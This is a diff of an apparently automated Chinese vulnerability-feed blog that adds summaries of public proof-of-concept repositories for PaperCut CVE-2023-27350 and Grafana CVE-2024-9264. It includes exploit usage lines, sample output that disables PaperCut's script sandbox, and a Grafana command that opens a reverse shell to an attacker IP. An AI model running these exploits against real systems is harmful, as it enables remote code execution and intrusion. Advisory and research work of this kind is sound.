@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T14:01:14.476Z</updated>
+  <updated>2025-07-05T14:45:54.487Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PaperCut MF/NG 认证绕过漏洞</title>
+    <link href="http://example.com/2025/07/05/github_1528020309/"/>
+    <id>http://example.com/2025/07/05/github_1528020309/</id>
+    <published>2025-07-05T14:45:54.000Z</published>
+    <updated>2025-07-05T14:45:54.487Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PaperCut MF&#x2F;NG 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-27350</li></ul><p><strong>漏洞类型：</strong> 认证绕过</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PaperCut MF&#x2F;NG是一款广泛使用的打印管理软件，支持企业级打印服务的管理和监控，适用于多种操作系统平台。该软件因其功能强大和易于部署，在全球范围内被众多组织采用。此次发现的漏洞涉及PaperCut MF&#x2F;NG版本8.0及以上（不包括已修补版本），影响所有操作系统平台。</p><p>漏洞的核心在于认证绕过机制，攻击者可以利用此漏洞绕过正常的认证流程，进而滥用内置的脚本功能执行任意代码。技术根源在于软件未能正确验证用户的身份，导致攻击者可以在未授权的情况下访问和修改系统配置，如启用脚本执行功能并关闭沙箱保护，从而在系统上执行恶意代码。</p><p>此漏洞的安全风险极高，攻击者可以利用它在目标系统上远程执行代码，可能导致数据泄露、服务中断甚至完全控制系统。值得注意的是，此漏洞的利用不需要任何形式的认证，且可以通过自动化工具大规模利用，因此对使用受影响版本PaperCut MF&#x2F;NG的组织构成了严重威胁。建议所有用户立即更新到最新版本或按照PaperCut安全公告中的指导进行缓解措施。</p><p><strong>产品厂商：</strong> PaperCut</p><p><strong>产品名称：</strong> PaperCut MF&#x2F;NG</p><p><strong>影响版本：</strong> version 8.0 or later (excluding patched versions)</p><p><strong>来源：</strong> <a href="https://github.com/Royall-Researchers/CVE-2023-27350">https://github.com/Royall-Researchers/CVE-2023-27350</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2023-27350.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2023-27350"><a href="#CVE-2023-27350" class="headerlink" title="CVE-2023-27350"></a>CVE-2023-27350</h2><p>POC for CVE-2023-27350 affecting PaperCut MF&#x2F;NG</p><p>##Affected Versions ‘PaperCut MF or NG version 8.0 or later (excluding patched versions) on all OS platforms.’</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>This POC uses an authentication bypass vulnerability chained with abuse of builtin scripting functionality to execute code.</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 CVE-2023-27350.py --url &#x27;http://10.0.40.56:9191&#x27; --command calc.exe<br>[*] Papercut instance is vulnerable! Obtained valid JSESSIONID<br>[*] Updating print-and-device.script.enabled to Y<br>[*] Updating print.script.sandboxed to N<br>[*] Prepparing to execute...<br>[+] Executed successfully!<br>[*] Updating print-and-device.script.enabled to N<br>[*] Updating print.script.sandboxed to Y<br></code></pre></td></tr></table></figure><h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>Update to the latest version or mitigate by following the instructions within the PaperCut Security Advisory</p><ul><li><a href="https://www.papercut.com/kb/Main/PO-1216-and-PO-1219">https://www.papercut.com/kb/Main/PO-1216-and-PO-1219</a></li></ul><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PaperCut MF&amp;#x2F;NG 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;stro</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
+    
+    <category term="认证绕过" scheme="http://example.com/tags/%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Grafana SQL表达式远程代码执行漏洞</title>
+    <link href="http://example.com/2025/07/05/github_132909169/"/>
+    <id>http://example.com/2025/07/05/github_132909169/</id>
+    <published>2025-07-05T14:45:30.000Z</published>
+    <updated>2025-07-05T14:45:30.915Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Grafana SQL表达式远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-9264</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Grafana是一个开源的度量分析和可视化平台，广泛用于监控和观测数据，支持多种数据源，包括时序数据库如Prometheus、InfluxDB等。它通常被部署在企业级环境中，用于实时监控系统性能和健康状况。由于其强大的功能和灵活性，Grafana在全球范围内被广泛使用。</p><p>该漏洞存在于Grafana的SQL表达式功能中，由于输入验证不足，攻击者可以利用此漏洞执行任意shell命令。这一漏洞的根源在于Grafana未能充分清理用户提供的SQL表达式输入，导致攻击者可以通过构造恶意输入绕过安全限制，进而执行系统命令。特别是通过shellfs社区扩展，攻击者可以安装并加载该扩展以促进命令执行。</p><p>此漏洞的影响极为严重，因为它允许攻击者在受害服务器上执行任意命令，可能导致数据泄露、服务中断或其他恶意活动。值得注意的是，利用此漏洞需要攻击者拥有至少具有<code>Viewer</code>权限的认证用户凭证。这意味着漏洞的利用需要一定的前置条件，但一旦满足，攻击者可以远程执行代码，无需进一步的身份验证。因此，所有运行受影响版本Grafana的组织都应立即采取行动，应用安全补丁以防止潜在的攻击。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>影响版本：</strong> &gt;&#x3D; v11.0.0 (all v11.x.y are impacted)</p><p><strong>来源：</strong> <a href="https://github.com/Royall-Researchers/CVE-2024-9264">https://github.com/Royall-Researchers/CVE-2024-9264</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-9264-RCE-Exploit-in-Grafana-via-SQL-Expressions"><a href="#CVE-2024-9264-RCE-Exploit-in-Grafana-via-SQL-Expressions" class="headerlink" title="CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions"></a>CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Proof Of Concept for Remote Code Execution in Grafana (CVE-2024-9264)</p><p>This repository contains a Python script that exploits a Remote Code Execution (RCE) vulnerability in Grafana’s SQL Expressions feature.<br>By leveraging insufficient input sanitization, this exploit allows an attacker to execute arbitrary shell commands on the server.<br>This is made possible through the shellfs community extension, which can be installed and loaded by an attacker to facilitate command execution.</p><h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><ul><li>authenticated Grafana user with <code>Viewer</code> permissions or higher</li><li>DuckDB binary must be installed and accessible through Grafana’s PATH</li></ul><h3 id="Impacted-version"><a href="#Impacted-version" class="headerlink" title="Impacted version"></a>Impacted version</h3><p>Grafana &gt;&#x3D; v11.0.0 (all v11.x.y are impacted)</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> poc.<span class="hljs-keyword">py</span> [--url <span class="hljs-symbol">&lt;target&gt;</span>] [--username <span class="hljs-symbol">&lt;username&gt;</span>] [--password <span class="hljs-symbol">&lt;password&gt;</span>] [--<span class="hljs-built_in">reverse</span>-ip <span class="hljs-symbol">&lt;IP&gt;</span>] [--<span class="hljs-built_in">reverse</span>-port <span class="hljs-symbol">&lt;PORT&gt;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://github.com/user-attachments/assets/f62d946d-0195-45db-b28e-0cdb6c94985c" alt="14"></p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python poc.py <span class="hljs-params">--url</span> http:<span class="hljs-string">//127.0.0.1</span><span class="hljs-function">:3000</span> <span class="hljs-params">--username</span> eviluser <span class="hljs-params">--password</span> eviluser <span class="hljs-params">--reverse-ip</span> 10.10.1.41 <span class="hljs-params">--reverse-port</span> 9001<br></code></pre></td></tr></table></figure><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This script is intended for educational purposes and for use in controlled environments where you have permission to test the security of the system. Misuse of this tool could lead to legal consequences.</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p><a href="https://zekosec.com/blog/file-read-grafana-cve-2024-9264/">https://zekosec.com/blog/file-read-grafana-cve-2024-9264/</a></p><p><a href="https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/">https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana SQL表达式远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>freedomhack101 Twitter Update !</title>
@@ -474,58 +528,6 @@
     
     
     <category term="omvapt" scheme="http://example.com/tags/omvapt/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>freedomhack101 Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1003276343/"/>
-    <id>http://example.com/2025/07/05/twitter_1003276343/</id>
-    <published>2025-07-05T13:00:14.000Z</published>
-    <updated>2025-07-05T13:00:14.407Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> freedomhack101</p><p><strong>推文：</strong> CVE-2025-34067（CVSS 10.0）：海康威视applyCT中存在一个严重漏洞，允许通过Fastjson反序列化实现未认证的远程代码执行（RCE），危及监控系统安全。</p><p><a href="https://t.co/oQmeYznWCP">https://t.co/oQmeYznWCP</a></p><p><strong>链接：</strong> <a href="https://x.com/freedomhack101/status/1941481824825618557">https://x.com/freedomhack101/status/1941481824825618557</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; freedomhack101&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-34067（CVSS 10.0）：海康威视applyCT中存在一个严重漏洞，允许通过Fastjson反序列化实现未认证的远程代码</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="freedomhack101" scheme="http://example.com/tags/freedomhack101/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>aiohttp 未授权访问漏洞</title>
-    <link href="http://example.com/2025/07/05/github_1398700009/"/>
-    <id>http://example.com/2025/07/05/github_1398700009/</id>
-    <published>2025-07-05T12:46:11.000Z</published>
-    <updated>2025-07-05T12:46:11.271Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> aiohttp 未授权访问漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-23334</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> aiohttp是一个基于Python的异步HTTP客户端&#x2F;服务器框架，广泛用于构建高性能的Web服务和应用程序。它支持服务器和客户端功能，常用于需要高并发处理的场景。由于其高效的异步处理能力，aiohttp在现代Web开发中非常受欢迎。此次发现的漏洞CVE-2024-23334涉及未授权访问问题，可能允许攻击者在未经认证的情况下访问或操作受保护的资源。这种漏洞通常由于配置错误或访问控制机制缺失引起，可能导致敏感信息泄露或服务被未授权操作。攻击者可能利用此漏洞远程访问系统内部资源，无需任何形式的身份验证，从而对系统安全构成严重威胁。鉴于aiohttp的广泛应用，此漏洞的影响范围可能相当广泛，建议用户及时检查并更新到安全版本。</p><p><strong>产品名称：</strong> aiohttp</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/002ede54c20f26edb1121d305a3592737596ad00/python%2FCVE-2024-23334%2Fdocker-compose.yml">https://github.com/vulhub/vulhub/blob/002ede54c20f26edb1121d305a3592737596ad00/python%2FCVE-2024-23334%2Fdocker-compose.yml</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol"></span><br><span class="hljs-symbol">services:</span><br>  aiohttp-app:<br><span class="hljs-symbol">    build:</span><br><span class="hljs-symbol">      context:</span> .<br><span class="hljs-symbol">      dockerfile:</span> ../..<span class="hljs-keyword">/base/</span>python/python3<span class="hljs-number">.11</span>-slim/Dockerfile<br><span class="hljs-symbol">    container_name:</span> aiohttp<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;8080:8080&quot;</span><br><span class="hljs-symbol">    volumes:</span><br>      - ./static:<span class="hljs-keyword">/app/</span>static:ro<br><span class="hljs-symbol">    restart:</span> unless-stopped<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; aiohttp 未授权访问漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    
-    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
     
   </entry>
   
